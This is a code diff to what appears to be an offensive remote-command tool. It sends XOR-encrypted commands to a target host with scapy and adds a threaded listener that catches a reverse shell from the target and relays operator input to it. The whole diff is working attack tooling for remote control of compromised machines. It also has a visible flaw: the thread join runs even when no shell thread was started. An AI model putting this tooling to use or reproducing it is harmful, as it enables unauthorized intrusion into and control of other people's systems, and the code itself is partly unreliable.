@@ -6,6 +6,8 @@ from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from termcolor import colored
 import os
 import confuse
+import socket, sys, time
+import threading
 
 parsedConfig = {}
 
@@ -41,6 +43,37 @@ groupparams = {
     "COMMAND": "whoami",
     "TRANSPORT": "TCP"
 }
+
+
+def listen():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((shellparams['LHOST'], shellparams['LPORT']))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(colored(f"[+] Shell received from: {addr}\n\n","green"))
+    first = True
+    while True:
+        #Receive data from the target and get user input
+        ans = conn.recv(8192*2).decode()
+        sys.stdout.write(ans)
+        if first:
+            command = "\r"
+            first = False
+        else:
+            command = input()
+
+        #Send command
+        command += "\n"
+        conn.send(command.encode())
+        time.sleep(1)
+
+        #Remove the output of the "input()" function
+        sys.stdout.write("\033[A" + ans.split("\n")[-1])
+        if command == "exit\n":
+            break
+
+    s.close()
 
 def validGroupKey():
     key = groupparams["GROUP"]
@@ -319,7 +352,9 @@ def verify(params):
 def execute(plaintext, params):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
-    print(encrypted.decode())
+    if baseparams["MODE"] == "SHELL":
+        t = threading.Thread(target=listen, args=())
+        t.start()
 
     if(params["TRANSPORT"] == "UDP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
@@ -336,6 +371,9 @@ def execute(plaintext, params):
 
     RHOST = params["RHOST"]
     print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))
+
+    t.join()
+    print(colored("\n[*] Shell closed.\n", "blue"))
 
 if(__name__ == "__main__"):
     main()
